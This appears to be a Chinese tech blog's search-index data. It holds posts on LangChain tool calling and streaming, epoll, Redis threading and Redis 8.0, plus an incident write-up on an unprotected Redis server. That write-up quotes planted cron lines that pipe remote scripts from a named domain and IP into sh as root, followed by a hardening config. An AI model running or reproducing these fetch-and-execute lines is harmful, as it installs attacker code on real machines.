\u0026#39;height_in_meters\u0026#39;: {\u0026#39;title\u0026#39;: \u0026#39;Height In Meters\u0026#39;, \u0026#39;description\u0026#39;: \u0026#39;The height of the person expressed in meters.\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;number\u0026#39;}}, \u0026#39;required\u0026#39;: [\u0026#39;name\u0026#39;, \u0026#39;height_in_meters\u0026#39;]}}} \\`\\`\\`. Make sure to wrap the answer in \\`\\`\\`json and \\`\\`\\` tags Human: Anna is 23 years old and she is 6 feet tall \u0026#34;\u0026#34;\u0026#34; 使用解析器后\nchain = prompt | llm | extract_json chain.invoke({\u0026#34;query\u0026#34;: query}) \u0026#34;\u0026#34;\u0026#34; [{\u0026#39;people\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;Anna\u0026#39;, \u0026#39;height_in_meters\u0026#39;: 1.8288}]}] \u0026#34;\u0026#34;\u0026#34; 在聊天过程中将工具调用 定义工具模式 python函数定义: 需要再描述中，详细描述工具的功能以及他的参数是啥？\ndef add(a: int, b: int) -\u0026gt; int: \u0026#34;\u0026#34;\u0026#34;Add two integers. Args: a: First integer b: Second integer \u0026#34;\u0026#34;\u0026#34; return a + b def multiply(a: int, b: int) -\u0026gt; int: \u0026#34;\u0026#34;\u0026#34;Multiply two integers. Args: a: First integer b: Second integer \u0026#34;\u0026#34;\u0026#34; return a * b 使用 Pydantic 类定义\nfrom pydantic import BaseModel, Field class add(BaseModel): \u0026#34;\u0026#34;\u0026#34;Add two integers.\u0026#34;\u0026#34;\u0026#34; a: int = Field(..., description=\u0026#34;First integer\u0026#34;) b: int = Field(..., description=\u0026#34;Second integer\u0026#34;) class multiply(BaseModel): \u0026#34;\u0026#34;\u0026#34;Multiply two integers.\u0026#34;\u0026#34;\u0026#34; a: int = Field(..., description=\u0026#34;First integer\u0026#34;) b: int = Field(..., description=\u0026#34;Second integer\u0026#34;) 使用 TypedDict 的注解\nfrom typing_extensions import Annotated, TypedDict class add(TypedDict): \u0026#34;\u0026#34;\u0026#34;Add two integers.\u0026#34;\u0026#34;\u0026#34; # Annotations must have the type and can optionally include a default value and description (in that order). a: Annotated[int, ..., \u0026#34;First integer\u0026#34;] b: Annotated[int, ..., \u0026#34;Second integer\u0026#34;] class multiply(TypedDict): \u0026#34;\u0026#34;\u0026#34;Multiply two integers.\u0026#34;\u0026#34;\u0026#34; a: Annotated[int, ..., \u0026#34;First integer\u0026#34;] b: Annotated[int, ..., \u0026#34;Second integer\u0026#34;] 模型绑定方法.bind_tools 使用 .bind_tools() 方法，将处理将 add 和 multiply 模式转换为模型的适当格式。工具模式随后将在每次调用模型时传入。\nimport getpass import os if not os.environ.get(\u0026#34;OPENAI_API_KEY\u0026#34;): os.environ[\u0026#34;OPENAI_API_KEY\u0026#34;] = getpass.getpass(\u0026#34;Enter API key for OpenAI: \u0026#34;) from langchain.chat_models import init_chat_model llm = init_chat_model(\u0026#34;gpt-4o-mini\u0026#34;, model_provider=\u0026#34;openai\u0026#34;) llm_with_tools = llm.bind_tools(tools) query = \u0026#34;What is 3 * 12?\u0026#34; llm_with_tools.invoke(query) AIMessage(content=\u0026#39;\u0026#39;, additional_kwargs={\u0026#39;tool_calls\u0026#39;: [{\u0026#39;id\u0026#39;: \u0026#39;call_iXj4DiW1p7WLjTAQMRO0jxMs\u0026#39;, \u0026#39;function\u0026#39;: {\u0026#39;arguments\u0026#39;: \u0026#39;{\u0026#34;a\u0026#34;:3,\u0026#34;b\u0026#34;:12}\u0026#39;, \u0026#39;name\u0026#39;: \u0026#39;multiply\u0026#39;}, \u0026#39;type\u0026#39;: \u0026#39;function\u0026#39;}], \u0026#39;refusal\u0026#39;: None}, response_metadata={\u0026#39;token_usage\u0026#39;: {\u0026#39;completion_tokens\u0026#39;: 17, \u0026#39;prompt_tokens\u0026#39;: 80, \u0026#39;total_tokens\u0026#39;: 97}, \u0026#39;model_name\u0026#39;: \u0026#39;gpt-4o-mini-2024-07-18\u0026#39;, \u0026#39;system_fingerprint\u0026#39;: \u0026#39;fp_483d39d857\u0026#39;, \u0026#39;finish_reason\u0026#39;: \u0026#39;tool_calls\u0026#39;, \u0026#39;logprobs\u0026#39;: None}, id=\u0026#39;run-0b620986-3f62-4df7-9ba3-4595089f9ad4-0\u0026#39;, tool_calls=[{\u0026#39;name\u0026#39;: \u0026#39;multiply\u0026#39;, \u0026#39;args\u0026#39;: {\u0026#39;a\u0026#39;: 3, \u0026#39;b\u0026#39;: 12}, \u0026#39;id\u0026#39;: \u0026#39;call_iXj4DiW1p7WLjTAQMRO0jxMs\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;tool_call\u0026#39;}], usage_metadata={\u0026#39;input_tokens\u0026#39;: 80, \u0026#39;output_tokens\u0026#39;: 17, \u0026#39;total_tokens\u0026#39;: 97}) 工具调用 tool_calls 聊天模型可以同时调用多个工具。\n另外请注意，有时模型提供者可能会输出格式错误的工具调用（例如，参数不是有效的 JSON）。在这些情况下解析失败时， .invalid_tool_calls 属性中会填充 InvalidToolCall 实例。 query = \u0026#34;What is 3 * 12? Also, what is 11 + 49?\u0026#34; llm_with_tools.invoke(query).tool_calls \u0026#34;\u0026#34;\u0026#34; [{\u0026#39;name\u0026#39;: \u0026#39;multiply\u0026#39;, \u0026#39;args\u0026#39;: {\u0026#39;a\u0026#39;: 3, \u0026#39;b\u0026#39;: 12}, \u0026#39;id\u0026#39;: \u0026#39;call_1fyhJAbJHuKQe6n0PacubGsL\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;tool_call\u0026#39;}, {\u0026#39;name\u0026#39;: \u0026#39;add\u0026#39;, \u0026#39;args\u0026#39;: {\u0026#39;a\u0026#39;: 11, \u0026#39;b\u0026#39;: 49}, \u0026#39;id\u0026#39;: \u0026#39;call_fc2jVkKzwuPWyU7kS9qn1hyG\u0026#39;, \u0026#39;type\u0026#39;: \u0026#39;tool_call\u0026#39;}] \u0026#34;\u0026#34;\u0026#34; 流式输出 流式处理对于让基于 LLMs 的应用程序对终端用户感觉响应迅速至关重要。所以重要的 langchain 原生 就支持流式输出接口了。\n同步流 import getpass import os if not os.environ.get(\u0026#34;OPENAI_API_KEY\u0026#34;): os.environ[\u0026#34;OPENAI_API_KEY\u0026#34;] = getpass.getpass(\u0026#34;Enter API key for OpenAI: \u0026#34;) from langchain.chat_models import init_chat_model model = init_chat_model(\u0026#34;gpt-4o-mini\u0026#34;, model_provider=\u0026#34;openai\u0026#34;) 一般使用流\nchunks = [] for chunk in model.stream(\u0026#34;what color is the sky?\u0026#34;): chunks.append(chunk) print(chunk.content, end=\u0026#34;|\u0026#34;, flush=True) \u0026#34;\u0026#34;\u0026#34; The| sky| appears| blue| during| the| day|.| \u0026#34;\u0026#34;\u0026#34; 异步框架中使用流\nchunks = [] async for chunk in model.astream(\u0026#34;what color is the sky?\u0026#34;): chunks.append(chunk) print(chunk.content, end=\u0026#34;|\u0026#34;, flush=True) \u0026#34;\u0026#34;\u0026#34; The| sky| appears| blue| during| the| day|.| \u0026#34;\u0026#34;\u0026#34; 流里面到底是啥？\nchunks[0] \u0026#34;\u0026#34;\u0026#34; AIMessageChunk(content=\u0026#39;The\u0026#39;, id=\u0026#39;run-b36bea64-5511-4d7a-b6a3-a07b3db0c8e7\u0026#39;) \u0026#34;\u0026#34;\u0026#34; 如果在使用流式传输的时候，碰到传输json怎么办？要知道依赖json.loads来解析json，如果消息不完整会解析失败的\n解决方法就是尝试将部分json \u0026ldquo;自动补全\u0026rdquo; 为有效状态 from langchain_core.output_parsers import JsonOutputParser chain = ( model | JsonOutputParser() ) # Due to a bug in older versions of Langchain, JsonOutputParser did not stream results from some models async for text in chain.astream( \u0026#34;output a list of the countries france, spain and japan and their populations in JSON format. \u0026#34; \u0026#39;Use a dict with an outer key of \u0026#34;countries\u0026#34; which contains a list of countries. \u0026#39; \u0026#34;Each country should have the key `name` and `population`\u0026#34; ): print(text, flush=True) \u0026#34;\u0026#34;\u0026#34; {} {\u0026#39;countries\u0026#39;: []} {\u0026#39;countries\u0026#39;: [{}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;\u0026#39;}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;France\u0026#39;}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;France\u0026#39;, \u0026#39;population\u0026#39;: 67}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;France\u0026#39;, \u0026#39;population\u0026#39;: 67413}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;France\u0026#39;, \u0026#39;population\u0026#39;: 67413000}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;France\u0026#39;, \u0026#39;population\u0026#39;: 67413000}, {}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;France\u0026#39;, \u0026#39;population\u0026#39;: 67413000}, {\u0026#39;name\u0026#39;: \u0026#39;\u0026#39;}]} {\u0026#39;countries\u0026#39;: [{\u0026#39;name\u0026#39;: \u0026#39;France\u0026#39;, \u0026#39;population\u0026#39;: 67413000}, {\u0026#39;name\u0026#39;: \u0026#39;Spain\u0026#39;}]} ... \u0026#34;\u0026#34;\u0026#34; 生成器与流式输出 from langchain_core.output_parsers import JsonOutputParser async def _extract_country_names_streaming(input_stream): \u0026#34;\u0026#34;\u0026#34;A function that operates on input streams.\u0026#34;\u0026#34;\u0026#34; country_names_so_far = set() async for input in input_stream: if not isinstance(input, dict): continue if \u0026#34;countries\u0026#34; not in input: continue countries = input[\u0026#34;countries\u0026#34;] if not isinstance(countries, list): continue for country in countries: name = country.get(\u0026#34;name\u0026#34;) if not name: continue if name not in country_names_so_far: yield name country_names_so_far.add(name) chain = model | JsonOutputParser() | _extract_country_names_streaming async for text in chain.astream( \u0026#34;output a list of the countries france, spain and japan and their populations in JSON format. \u0026#34; \u0026#39;Use a dict with an outer key of \u0026#34;countries\u0026#34; which contains a list of countries. \u0026#39; \u0026#34;Each country should have the key `name` and `population`\u0026#34;, ): print(text, end=\u0026#34;|\u0026#34;, flush=True) \u0026#34;\u0026#34;\u0026#34; France|Spain|Japan| \u0026#34;\u0026#34;\u0026#34; 非流式组件想要流式输出 一些内置组件（如检索器）不提供任何 streaming 。但我们又想尝试 stream\n直接给结论，对于这些情况，要么难于实现，要么没有意义，所以如果遇到组件没有提供流式输出的情况，直接等处理完一次性返回 from langchain_community.vectorstores import FAISS from langchain_core.output_parsers import StrOutputParser from langchain_core.prompts import ChatPromptTemplate from langchain_core.runnables import RunnablePassthrough from langchain_openai import OpenAIEmbeddings template = \u0026#34;\u0026#34;\u0026#34;Answer the question based only on the following context: {context} Question: {question} \u0026#34;\u0026#34;\u0026#34; prompt = ChatPromptTemplate.from_template(template) vectorstore = FAISS.from_texts( [\u0026#34;harrison worked at kensho\u0026#34;, \u0026#34;harrison likes spicy food\u0026#34;], embedding=OpenAIEmbeddings(), ) retriever = vectorstore.as_retriever() chunks = [chunk for chunk in retriever.stream(\u0026#34;where did harrison work?\u0026#34;)] chunks \u0026#34;\u0026#34;\u0026#34; [[Document(page_content=\u0026#39;harrison worked at kensho\u0026#39;), Document(page_content=\u0026#39;harrison likes spicy food\u0026#39;)]] \u0026#34;\u0026#34;\u0026#34; Events 流 这是一个测试版本，暂时先不讨论了吧\n✅ 实时 UI 更新（如前端流式展示） ✅ 日志记录和可视化 ✅ 调试和性能分析 ✅ 实现复杂的控制流或自动化系统 调试 LLM 应用 LLMs构建时，由于链式的调用，导致无法明确在哪个环节产生了错误的输出，最终导致全局的任务失败，所以需要好好调试App\n当下的调试大致有三种方式： 1. 添加打印语句 2. 添加日志语句 3. 使用langsmith追踪 使用langsmith 配置langsmith\nimport getpass import os os.environ[\u0026#34;LANGSMITH_TRACING\u0026#34;] = \u0026#34;true\u0026#34; os.environ[\u0026#34;LANGSMITH_API_KEY\u0026#34;] = getpass.getpass() 配置llm\nimport getpass import os if not os.environ.get(\u0026#34;OPENAI_API_KEY\u0026#34;): os.environ[\u0026#34;OPENAI_API_KEY\u0026#34;] = getpass.getpass(\u0026#34;Enter API key for OpenAI: \u0026#34;) from langchain.chat_models import init_chat_model llm = init_chat_model(\u0026#34;gpt-4o-mini\u0026#34;, model_provider=\u0026#34;openai\u0026#34;) 调用\nfrom langchain.agents import AgentExecutor, create_tool_calling_agent from langchain_community.tools.tavily_search import TavilySearchResults from langchain_core.prompts import ChatPromptTemplate tools = [TavilySearchResults(max_results=1)] prompt = ChatPromptTemplate.from_messages( [ ( \u0026#34;system\u0026#34;, \u0026#34;You are a helpful assistant.\u0026#34;, ), (\u0026#34;placeholder\u0026#34;, \u0026#34;{chat_history}\u0026#34;), (\u0026#34;human\u0026#34;, \u0026#34;{input}\u0026#34;), (\u0026#34;placeholder\u0026#34;, \u0026#34;{agent_scratchpad}\u0026#34;), ] ) # Construct the Tools agent agent = create_tool_calling_agent(llm, tools, prompt) # Create an agent executor by passing in the agent and tools agent_executor = AgentExecutor(agent=agent, tools=tools) agent_executor.invoke( {\u0026#34;input\u0026#34;: \u0026#34;Who directed the 2023 film Oppenheimer and what is their age in days?\u0026#34;} ) \u0026#34;\u0026#34;\u0026#34; {\u0026#39;input\u0026#39;: \u0026#39;Who directed the 2023 film Oppenheimer and what is their age in days?\u0026#39;, \u0026#39;output\u0026#39;: \u0026#39;The 2023 film \u0026#34;Oppenheimer\u0026#34; was directed by Christopher Nolan.\\n\\nTo calculate Christopher Nolan\\\u0026#39;s age in days, we first need his birthdate, which is July 30, 1970. Let\\\u0026#39;s calculate his age in days from his birthdate to today\\\u0026#39;s date, December 7, 2023.\\n\\n1. Calculate the total number of days from July 30, 1970, to December 7, 2023.\\n2. Nolan was born on July 30, 1970. From July 30, 1970, to July 30, 2023, is 53 years.\\n3. From July 30, 2023, to December 7, 2023, is 130 days.\\n\\nNow, calculate the total days:\\n- 53 years = 53 x 365 = 19,345 days\\n- Adding leap years from 1970 to 2023: There are 13 leap years (1972, 1976, 1980, 1984, 1988, 1992, 1996, 2000, 2004, 2008, 2012, 2016, 2020). So, add 13 days.\\n- Total days from years and leap years = 19,345 + 13 = 19,358 days\\n- Add the days from July 30, 2023, to December 7, 2023 = 130 days\\n\\nTotal age in days = 19,358 + 130 = 19,488 days\\n\\nChristopher Nolan is 19,488 days old as of December 7, 2023.\u0026#39;} \u0026#34;\u0026#34;\u0026#34; 访问 下面这个 连接可以轻松查看各个模型之间调用的关系 点我看看\n输出中间日志 set_verbose(True) 设置 verbose 标志将以稍微更易读的格式打印输入和输出，并跳过记录某些原始输出（例如 LLM 调用的令牌使用统计信息），以便您专注于应用程序逻辑。\nfrom langchain.globals import set_verbose set_verbose(True) agent_executor = AgentExecutor(agent=agent, tools=tools) agent_executor.invoke( {\u0026#34;input\u0026#34;: \u0026#34;Who directed the 2023 film Oppenheimer and what is their age in days?\u0026#34;} ) set_debug(True) 设置全局 debug 标志将使所有支持回调的 LangChain 组件（链、模型、代理、工具、检索器）打印它们接收到的输入和生成的输出。这是最详细的设置，将完全记录原始输入和输出。\nfrom langchain.globals import set_debug set_debug(True) set_verbose(False) agent_executor = AgentExecutor(agent=agent, tools=tools) agent_executor.invoke( {\u0026#34;input\u0026#34;: \u0026#34;Who directed the 2023 film Oppenheimer and what is their age in days?\u0026#34;} ) ","permalink":"https://al6nlee.github.io/post/%E5%A4%A7%E6%A8%A1%E5%9E%8B/langchain/02-%E6%A0%B8%E5%BF%83%E7%89%B9%E6%80%A7.html","summary":"\u003cp\u003e本章节主要讲述langchain的一些核心功: ①: 模型返回结构化数据；②: 调用工具；③: 流式运行；④ 调试LLM应用\u003c/p\u003e","title":"02-核心特性"},{"content":"本文简述了epoll出来前，在C10K上的难点问题，阐述了epoll变成思路，最后将redis2.6.4进行了案例分析\nC10K问题 简单些理解就是: 实现单机1万长连接\n在epoll之前，问题难点主要是 线程与连接是耦合的，一个连接对应一个线程 epoll编程思路 业务场景 作为服务端，我们只需要处理3种情况：\n处理客户端的连接请求 处理客户端发送的命令 返回响应给客户端 动作 对应事件 处理逻辑说明 处理客户端连接请求 listen_sock上的READABLE事件 对应listen_sock的read handler\n1. 新建一个client_sock，完成TCP 3次握手\n2. 将新的client_sock作为事件源注册到epoll 处理客户端命令 client_sock上的READABLE事件 对应client_sock的read handler\n读取客户端发送的命令，解析执行，并返回结果给客户端 返回应答给客户端 client_sock上的WRITABLE事件 对应client_sock的write handler\n为了防止发送方发的太快，接收方处理不过来，TCP协议是有一个滑动窗口的。A给B发消息时，会保证发送的内容大小不超过B当前的剩余缓冲区 如果服务端返回结果很大，超过了客户端的当前剩余缓冲区，那就只能先写一部分，并且用一个专门的字段记录写了多少。等到客户端腾出空间了，会再通知服务端。这时候，服务端就会触发写就绪事件，再把之前剩余的内容写到客户端 #define MAX_EVENTS 10 struct epoll_event ev, events[MAX_EVENTS]; int listen_sock, cAonn_sock, nfds, epollfd; /* Code to set up listening socket, \u0026#39;listen_sock\u0026#39;, (socket(), bind(), listen()) omitted */ // 创建epoll内部用到的结构 epollfd = epoll_create1(0); // 将server socket作为一个事件源添加到epoll的监听队列中 ev.events = EPOLLIN; ev.data.fd = listen_sock; if (epoll_ctl(epollfd, EPOLL_CTL_ADD, listen_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: listen_sock\u0026#34;); exit(EXIT_FAILURE); } // epoll主循环 for (;;) { // 探测是否有就绪的连接 nfds = epoll_wait(epollfd, events, MAX_EVENTS, -1); // 对所有就绪的连接，逐个处理连接上的事件 for (n = 0; n \u0026lt; nfds; ++n) { // 如果是在server socket上发生的事件， // 那一定是有新的客户端要建立连接 if (events[n].data.fd == listen_sock) { // 完成连接建立 conn_sock = accept(listen_sock, (struct sockaddr *) \u0026amp;addr, \u0026amp;addrlen); // 设置非阻塞标记位 setnonblocking(conn_sock); ev.events = EPOLLIN | EPOLLET; ev.data.fd = conn_sock; // 将新建立的连接作为事件源，添加到epoll的监听队列 if (epoll_ctl(epollfd, EPOLL_CTL_ADD, conn_sock, \u0026amp;ev) == -1) { perror(\u0026#34;epoll_ctl: conn_sock\u0026#34;); exit(EXIT_FAILURE); } } else { // 对于读写事件，根据业务需求做相应的处理 do_use_fd(events[n].data.fd); } } } 边缘/水平触发 边缘触发（edge triggered） 和 水平触发（level triggered）\n客户端发过来的命令可能还不完整 此时，你有2种选择：\n直接不读取缓冲区，等到命令完整了，再一次性读出来 先把不完整的命令读出来，暂存起来 默认情况下，只要缓冲区有数据，就会触发事件\n第一种方式下，如果命令一直不完整，就会一直重复触发事件，影响性能 第二种方式下，因为已经读了缓冲区，所以不会重复触发事件，性能好，但需要自己维护一个暂存区，比较麻烦 由此，对应epoll的2种事件触发类型\n触发类型 触发规则 优缺点 水平触发 只要可以读/写，就不断触发\n1. 读 只要读缓冲区有数据就触发\n2. 写 只要写缓冲区不满就触发 有无效触发，性能差\n不需要自己维护暂存区，编程简单 边缘触发 状态变化才触发\n1. 读 从不可读变成可读才触发 读缓冲区从没有数据变成有数据才触发 如果前一次的数据没读完，又来了新数据，是不触发的 2. 写 从不可写变成可写才触发 写缓冲区从没有剩余空间变成有剩余空间 没有无效触发，性能好\n需要自己维护暂存区，编程复杂 epoll案例分析: redis2.6.4 注册listen_sock的read handler 关键方法 重点代码截图 redis.c\nmain() redis.c\ninitServer()\n注册listen_sock的读就绪事件处理器acceptTcpHandler()，\n后续会具体分析这个处理器 ae.c\naeCreateFileEvent() ae_epoll.c\naeApiAddEvent() 启动epoll主循环 关键方法 重点代码截图 redis.c\nmain() ae.c\naeMain() ae.c\naeProcessEvents()\n注意：\n1. fe-\u0026gt;rfileProc 对应读就绪事件的handler\n2. fe-\u0026gt;wfileProc 对应写就绪事件的handler ae_epoll.c\naeApiPoll() 连接建立流程 客户端和服务端建立连接的过程，对应的就是listen_sock的read handler\n关键方法 重点代码截图 networking.c\nacceptTcpHandler()\n1. 完成连接建立（3次握手）\n2. 通过acceptCommonHandler()完成后续操作 networking.c\nacceptCommonHandler() networking.c\ncreateClient()\n注册新创建的client_sock的读事件处理器到epoll 处理请求流程 请求处理流程，对应的就是client_sock的read handler\n关键方法 重点代码截图 networking.c\nreadQueryFromClient()\n读取客户端请求，并调用**processInputBuffer()**处理 networking.c\nprocessInputBuffer() 返回结果流程 返回结果时，不是直接通过write()写数据到客户端，而是同样走epoll\n先注册client_sock的write handler，然后往暂存区追加数据 由于redis用的是level triggered，所以下次调用epoll_wait()时， 只要操作系统层的缓冲区不是满的，就会触发写就绪事件 于是触发第1步注册的write handler，通过write handler把暂存区的数据写到客户端 可能出现暂存区的数据很多，每次只能写一部分，所以redis还会额外记录当前写到哪里了 每触发一次write handler，就从上次的位置继续往后写 暂存区全部写完之后，再把第1步注册的write handler移除掉 以避免level triggered重复触发无效的写就绪事件 下面我们分2部分看：\n注册write handler Write handler的具体逻辑 注册 write handler 关键方法 重点代码截图 networking.c\naddReply()\n1. 通过prepareClientToWrite()注册写事件处理器\n2. 再通过_addReplyToBuffer()往暂存区追加数据 networking.c\nprepareClientToWrite()\n注册client_sock的写事件处理器到epoll networking.c\nsendReplyToClient()\n写处理器 write handler 关键方法 重点代码截图 networking.c\nsendReplyToClient()\n在循环里面调用write()，直到write()返回-1，表示出错或者缓冲区已满 networking.c\nsendReplyToClient()\n1. 通过errno == EAGAIN判断是写缓冲区满了，还是出错了 2. 暂存区写完以后，通过aeDeleteFileEvent()移除之前注册的write handler ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/02-epoll%E7%BC%96%E7%A8%8B%E7%AE%80%E6%9E%90.html","summary":"\u003cp\u003e本文简述了epoll出来前，在C10K上的难点问题，阐述了epoll变成思路，最后将redis2.6.4进行了案例分析\u003c/p\u003e","title":"02-epoll编程简析"},{"content":"本文讨论了Redis线程模型的演进，从2.6.4版本的单epoll + 单线程到6.0.20版本的单epoll + 多线程，再到8.0版本的多epoll + 多线程，并对Redis 8.0版本的线程模型进行了源码分析。\n线程模型演进历程 版本 模型 说明 2.6.4 单epoll + 单线程 最简单的epoll编程模型，epoll循环和读写操作都在一个线程内完成 6.0.20 单epoll + 多线程\n优点：引入IO线程帮忙分摊读写数据的工作量\n遗留问题：执行读/写操作时，需要等所有线程都完成了，才能进行下一步，这里会存在阻塞 1. 主线程负责驱动epoll循环\n2. 获取到IO事件后，主线程和IO线程一起读取不同客户端的请求命令\n3. 待所有线程完成读取后，再由主线程负责执行命令 这里有一个等待动作\n4. 命令执行完成后，再由所有线程一起返回结果给客户端\n5. 待所有线程的写任务完成后，主线程再进入epoll_wait() 这里也有一个等待动作 8.0 多epoll + 多线程\n8.0版本中，采用了全异步的处理，消除了阻塞\n1. IO线程读取完命令后，异步通知主线程 2. 主线程执行完命令后，再异步通知IO线程\n3. 最后由IO线程返回结果给客户端 主线程和IO线程都会驱动各自的epoll，其中，\n主线程负责：\n1. 响应listen_sock上的事件 完成连接建立后，将新创建的client_sock分配给最闲的线程 也就是，对应的epoll上注册的sock最少的线程，包括主线程\n2. 响应client_sock上的事件 读取命令或者做应答，这一点和IO线程没有区别 即：主线程也会被当做一个IO线程来用\n3. 接受自己或者IO线程读取好的命令，实际执行命令 即：命令还是由主线程这一个线程执行\n4. 执行完命令后，再由相应的线程完成应答 可能是主线程，也可能是某个IO线程，取决于当前client_sock注册在哪个线程上\nIO线程负责：\n1. 将主线程分发的client_sock注册到自己的epoll上\n2. 响应client_sock上的事件 读取命令或者做应答\n3. 完成读操作后，将命令转交给主线程执行\n4. 完成主线程转交回来的写任务 ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/03-redis%E7%BA%BF%E7%A8%8B%E6%BC%94%E8%BF%9B.html","summary":"\u003cp\u003e本文讨论了Redis线程模型的演进，从2.6.4版本的单epoll + 单线程到6.0.20版本的单epoll + 多线程，再到8.0版本的多epoll + 多线程，并对Redis 8.0版本的线程模型进行了源码分析。\u003c/p\u003e","title":"03-redis线程演进"},{"content":"前不久redis8.0正式发布了，看看都更新了啥?\n新增八种数据结构\n向量集（测试版）、JSON、时间序列，以及 Bloom filter、cuckoo filter、count-min sketch、top-k 和 t-digest 五种概率性结构（其中一些之前作为独立的 Redis 模块提供）\n显著的性能改进\n命令延迟最高降低 87% 通过启用多线程，每秒操作吞吐量提升 2 倍 在 Redis 8 中，我们引入了新的 I/O 线程实现。您可以通过设置 io-threads 配置参数来启用它。默认值为 1。在多核 Intel CPU 上将参数设置为 8 时，我们测量到吞吐量最高提升了 112%。 复制使用的内存最高减少 35% 在 Redis 8 中，我们引入了一种新的复制机制。在复制过程中，我们同时启动两个复制流：一个用于传输主节点，另一个用于传输期间发生的变更流。第二阶段不再被阻塞等待第一阶段完成。 通过水平和垂直扩展，查询处理能力最高提升 16 倍 ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/04-redis8.0%E6%9B%B4%E6%96%B0%E4%BA%86%E5%95%A5.html","summary":"\u003cp\u003e前不久redis8.0正式发布了，看看都更新了啥?\u003c/p\u003e","title":"04-redis8.0更新了啥？"},{"content":"最近开发中遇到一个关于redis的安全事故，本身服务是放在内网，通过端口转发的，redis也就没有设置密码，万万没想到~~ 出事了！！\n数据库经常性被清 */2 * * * * root cd1 -fsSL http://natalstatus.org/ep9TS2/ndt.sh | sh */3 * * * * root wget -q -O- http://natalstatus.org/ep9TS2/ndt.sh | sh */4 * * * * root curl -fsSL http://103.79.77.16/ep9TS2/ndt.sh | sh */5 * * * * root wd1 -q -O- http://103.79.77.16/ep9TS2/ndt.sh | sh 发现数据库只留下这四个key，来看看里面存放的value，发现是一个恶意脚本，giao\n原本一直怀疑是自己的代码哪里有漏洞，导致数据库被不小心清了 最后竟然是这个 密码务必需要配置 安全性配置 # redis.conf # 开启RDB持久化（默认是开启的） save 900 1 save 300 10 save 60 10000 dir /data dbfilename dump.rdb # 开启AOF持久化 appendonly yes appendfilename \u0026#34;appendonly.aof\u0026#34; appendfsync everysec requirepass 123456 # 日志级别可选: debug, verbose, notice, warning（默认notice） loglevel notice # 日志文件（空表示输出到stdout） logfile \u0026#34;\u0026#34; # 设置为非守护进程模式，容器中必须 daemonize no # 禁用危险命令（推荐：防止误操作或被攻击者滥用） rename-command FLUSHALL \u0026#34;\u0026#34; rename-command FLUSHDB \u0026#34;\u0026#34; rename-command CONFIG \u0026#34;\u0026#34; rename-command DEBUG \u0026#34;\u0026#34; rename-command SHUTDOWN \u0026#34;\u0026#34; rename-command SAVE \u0026#34;\u0026#34; rename-command BGSAVE \u0026#34;\u0026#34; rename-command BGREWRITEAOF \u0026#34;\u0026#34; ","permalink":"https://al6nlee.github.io/post/%E6%95%B0%E6%8D%AE%E5%BA%93/redis/05-%E8%B8%A9%E5%9D%91.html","summary":"\u003cp\u003e最近开发中遇到一个关于redis的安全事故，本身服务是放在内网，通过端口转发的，redis也就没有设置密码，万万没想到~~ 出事了！！\u003c/p\u003e","title":"05-踩坑"},{"content":"","permalink":"https://al6nlee.github.io/about.html","summary":"","title":"关于作者"}]